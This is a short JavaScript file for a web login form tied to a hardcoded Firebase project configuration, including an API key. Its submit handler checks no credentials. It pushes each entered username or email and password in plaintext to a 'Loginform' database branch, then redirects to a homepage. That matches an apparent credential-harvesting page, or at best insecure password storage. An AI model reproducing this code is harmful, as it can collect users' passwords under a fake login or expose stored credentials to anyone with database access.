const firebaseConfig = {
  apiKey: "AIzaSyBG2WN4k3Me877QTwc65wUMd-0AyrT55Cg",
  authDomain: "allzwell-af788.firebaseapp.com",
  databaseURL: "https://allzwell-af788-default-rtdb.firebaseio.com",
  projectId: "allzwell-af788",
  storageBucket: "allzwell-af788.firebasestorage.app",
  messagingSenderId: "472403085872",
  appId: "1:472403085872:web:3ea0616bad417ae0d2bbf5",
  measurementId: "G-FS2TKGZVWE"
};

// Initialize Firebase
if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

const db = firebase.database();

// Listen for form submit
document.getElementById('loginForm').addEventListener('submit', (e) => {
  e.preventDefault();

  const userValue = document.getElementById('userInput').value;
  const passValue = document.getElementById('passInput').value;

  // Push entry under "Loginform" branch
  db.ref('Loginform').push({
    usernameOrEmail: userValue,
    password: passValue,
    submittedAt: new Date().toISOString()
  })
  .then(() => {
    alert("Data saved successfully to Firebase!");
    window.location.href = "homepage.html";
  })
  .catch((error) => {
    console.error("Firebase Error:", error);
    alert("Error saving data: " + error.message);
  });
});